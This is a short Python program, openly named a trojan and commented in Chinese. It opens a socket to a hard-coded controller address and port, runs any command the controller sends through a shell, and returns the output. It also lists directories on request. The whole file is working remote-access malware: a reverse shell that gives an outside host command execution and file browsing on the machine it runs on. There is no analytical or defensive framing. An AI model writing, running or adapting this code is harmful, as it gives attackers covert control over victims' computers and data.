import subprocess
import tkinter as tk
import socket
import threading
import os

def trojan():
    HOST = '172.29.41.16'
    PORT = 65000

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False
    traverse_mode = False


    while True:
        server_command = client.recv(1024).decode('utf-8', errors='ignore')
        #退出命令
        if server_command == "exit":
            break
        # 开启cmd终端
        if server_command == "cmdon":
            cmd_mode = True
            traverse_mode = False
            client.send("终端功能开启".encode('utf-8'))
            continue

        # 关闭cmd终端
        if server_command == "cmdoff":
            cmd_mode = False
            client.send("终端功能关闭".encode('utf-8'))

        if cmd_mode:
            # cmd命令
            # cmdstr = os.system(server_command)
            # client.send(f'{cmdstr}'.encode('utf-8'))
            result = subprocess.run(server_command, shell=True, stdout=subprocess.PIPE)
            client.send(result.stdout)  # 将命令输出发送给客户端

        # 遍历功能
        if server_command == "tron":
            traverse_mode = True
            cmd_mode = False
            client.send("遍历功能启动".encode('utf-8'))
            continue

        if server_command =="troff":
            traverse_mode = False
            client.send("遍历功能关闭".encode('utf-8'))

        if traverse_mode:
            # filename = os.listdir(server_command)
            # client.send(f'{filename}'.encode('utf-8'))
            if os.path.isdir(server_command):
                filename = os.listdir(server_command)
                client.send(f'{filename}'.encode('utf-8'))
            else:
                client.send("无效的目录名".encode('utf-8'))

        client.send(f'{server_command}成功执行！'.encode('utf-8'))

if __name__ == '__main__':
    t2 = threading.Thread(target=trojan)
    t2.start()
